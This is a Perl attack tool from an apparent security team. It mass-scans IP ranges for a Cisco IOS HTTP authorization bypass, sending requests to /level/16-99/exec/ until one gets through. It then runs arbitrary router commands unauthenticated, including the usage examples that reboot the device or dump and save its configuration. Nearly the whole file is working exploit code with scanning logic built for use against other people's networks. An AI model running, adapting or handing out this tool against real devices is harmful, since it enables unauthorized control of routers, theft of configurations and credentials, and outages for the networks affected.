#!/usr/bin/perl
###############

##
# getIOS.pl - coded by ca0s / EZKRACHO Security Team
#
# Network Scanner for the Cisco IOS HTTP authorization vulnerability.
# [Cisco Bug ID CSCdt93862]
#
# Mail:     caos@ezkracho.com.ar
# EKO web:  www.ezkracho.com.ar
# HomePage: www.getrewted.com.ar
#
# Released under the terms of the GNU General Public License.
# [ Download Perl modules from CPAN - http://search.cpan.org/ ]
#
#  obfuscated code? yes.. and i like it! :)
##

use Getopt::Std;
use LWP::UserAgent;

getopts("p:t:c:C:l:h", \%args);
if(defined $args{h}) { &Uso; }
if(defined $args{c}) { $command = $args{c}; $COMMAND_S=1; }
if(defined $args{C}) { $command = $args{C}; $COMMAND_E=1; }
if(defined $args{l}) { 
    $logfile = $args{l}; $LOGGING=1;
    open(LOG, ">$logfile") or die("(!) Error opening log file.\n");
    print LOG " -- getIOS.pl - ca0s [Ezkracho Team] - http://www.ezkracho.com.ar/\n\n";
    close(LOG);
}
if(defined $args{p}) { $proxy = $args{p}; $PROXY=1; }
if(defined $args{t}) { $timeout = $args{t}; $TIMEOUT=1; }
if($#ARGV != 0) { &Uso; }

$UA = LWP::UserAgent->new();
if ($PROXY) { 
    $UA->proxy('http', $proxy);
    if ($TIMEOUT) { $UA->timeout($timeout); }
    else { $UA->timeout(10); }
} 
if ($TIMEOUT) { $UA->timeout($timeout); }
else { $UA->timeout(1); }

Hackit($ARGV[0]); ##  All start here  ##


sub ScAn {
    $ip = $_[0];
    $granted = 0; 
    unless ($LOGGING) { print STDOUT "\nScanning ", $ip, "...\n"; }
    $url = "http://" . $ip . "/level/15/exec/";
    my $req = HTTP::Request->new(GET => $url);
    my $res = $UA->request($req);
    if ($res->code eq 401) {
	for ($level=16; $level < 100; $level++) {
	    if ($COMMAND_S or $COMMAND_E) {
		$url = "http://" . $ip . "/level/" . $level . "/exec/-" . $command;
	    } else { $url = "http://" . $ip . "/level/" . $level . "/exec/-"; }
	    my $req = HTTP::Request->new(GET => $url);
	    my $res = $UA->request($req);
	    if ($res->code eq 200) {
		if ($COMMAND_S) { 
		    open(LOG_C, ">$ip".".html") or die("Error opening command output file.\n");
		    print LOG_C $res->content; 
		    close(LOG_C);
		}
		if ($LOGGING) {
	    	    open(LOG, ">>$logfile") or die("(!) Error opening log file.\n");
		    unless ($time) { print LOG "[$ip] --> Vulnerable whit LEVEL $level \n"; }
		    close(LOG);
		} else { print STDOUT "[$ip] --> Vulnerable whit LEVEL $level \n"; $vuln = 1; }
		$level = 100;
		$granted = 1;
	    } 
	}
    } 
    unless ($LOGGING) { 
	unless ($granted) { print STDOUT "[Not Vulnerable]\n"; } 
    }
}

sub Hackit {
    ($partA,$partB,$partC,$partD) = split /\./, $_[0];
    my @part_A = CheckIP($partA);
    my @part_B = CheckIP($partB);
    my @part_C = CheckIP($partC);
    my @part_D = CheckIP($partD);
    for ($cA = 0; $cA < @part_A; $cA++) {
	for ($cB = 0; $cB < @part_B; $cB++) {
	    for ($cC = 0; $cC < @part_C; $cC++) {
		for ($cD = 0; $cD < @part_D; $cD++) {
		    my $full_ip = "$part_A[$cA].$part_B[$cB].$part_C[$cC].$part_D[$cD]";
		    ScAn($full_ip); ##  Call to ScAn function  ##
		}
	    }
	}    
    }
}


sub CheckIP {
    my ($parte) = @_;
    my (@retpart);
    my (@tmpart);
    my ($bed)=0;
    unless($parte =~ /\D/) {
	CheckRange($parte);
	$retpart[0] = $parte;
    } elsif($parte !~ /\-/ && $parte !~ /\*/ && $parte !~ /\,/) {
	&Uso;
    } elsif($parte =~ /\*/) {
	for($eko=0; $eko<=255; $eko++) { $retpart[$eko] = $eko; }
    } elsif($parte =~ /\,/) { 
	@tmpart = split(/\,/, $parte);
	foreach(@tmpart) {
	    unless($_ =~ /\D/) {
		CheckRange($_);
		$retpart[$bed] = $_;
		$bed++;
	    } elsif($_ =~ /(\d+)-(\d+)$/) {
	    	CheckRange($1);
		CheckRange($2);
		if($1 >= $2) { &Uso; }
		for($unf=$1; $unf<=$2; $unf++) {
		    $retpart[$bed] = $unf;
		    $bed++;   
		}
	    } else { &Uso; } 
	}    
    } elsif($parte =~ /(\d+)-(\d+)$/) {
    	CheckRange($1);
	CheckRange($2);
	if($1 >= $2) { &Uso; }
        for($unf=$1; $unf<=$2; $unf++) {
	    $retpart[$bed] = $unf;
	    $bed++;   
	}
    } else { &Uso; }
    @retpart;
}


sub CheckRange {
    my ($uff) = @_;
    if ($uff < 0 or $uff > 255) { &Uso; }
}


sub Uso {
    print "-- getIOS.pl - ca0s [Ezkracho Team] - http://www.ezkracho.com.ar/\n";
    print "\nUsage: $0 [Options] <host or net list>\n\n";
    print "[Options]\n";
    print " -C <command> to execute a command. (ex.: -C /reload/CR/)\n";    
    print " -c <command> to save the output of a command. (ex.: -c /show/conf/)\n";
    print " -l <logfile> log to file instead of stdout.\n";
    print " -p <proxy> use proxy to scan. (ex.: -p http://my.proxy.net:80/)\n";
    print " -t <seconds> time out.\n";
    print " -h this help.\n\n";
    print "<host or net list>\n";
    print " * for the 256 possibilities.\n";
    print " , to separate single numbers.\n";
    print " - to set number ranges.\n";
    print "\nExample: foo\$ $0 -c /show/conf/ 192.1,10-20,168.*.*\n";
    exit 1;
}
